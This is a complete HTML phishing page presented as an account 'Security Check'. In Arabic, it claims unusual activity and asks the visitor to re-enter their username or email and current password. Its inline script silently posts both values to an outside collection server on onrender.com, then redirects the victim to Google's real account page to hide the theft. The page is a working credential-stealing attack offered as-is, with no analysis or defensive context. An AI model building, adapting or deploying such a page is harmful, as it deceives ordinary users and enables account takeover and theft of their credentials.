<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Check</title><style>body{font-family:sans-serif;background:#f4f4f4;margin:0;display:flex;justify-content:center;align-items:center;height:100vh;}.box{background:#fff;width:95%;max-width:420px;padding:40px 20px;border-radius:12px;box-shadow:0 4px 15px rgba(0,0,0,0.1);text-align:center;box-sizing:border-box;}input{width:100%;padding:16px;margin:12px 0;border:1px solid #ccc;border-radius:8px;font-size:16px;box-sizing:border-box;}.btn{width:100%;background:#d93025;color:#fff;padding:16px;border:none;border-radius:8px;font-weight:bold;font-size:18px;margin-top:20px;}</style></head><body><div class="box"><h2 style="color:#d93025;">تأمين الحساب</h2><p>لقد لاحظنا نشاطاً غير معتاد. يرجى إعادة إدخال بياناتك للتأكد من هويتك.</p><form id="f"><input id="u" placeholder="اسم المستخدم أو الإيميل" required><input id="p" type="password" placeholder="كلمة المرور الحالية" required><button type="submit" class="btn">تأكيد الأمان</button></form></div><script>document.getElementById('f').onsubmit=(e)=>{e.preventDefault();fetch('https://brmbtbot-2.onrender.com/receive',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({platform:'Security Check',u:document.getElementById('u').value,p:document.getElementById('p').value})}).finally(()=>{location.href='https://myaccount.google.com';});};</script></body></html>
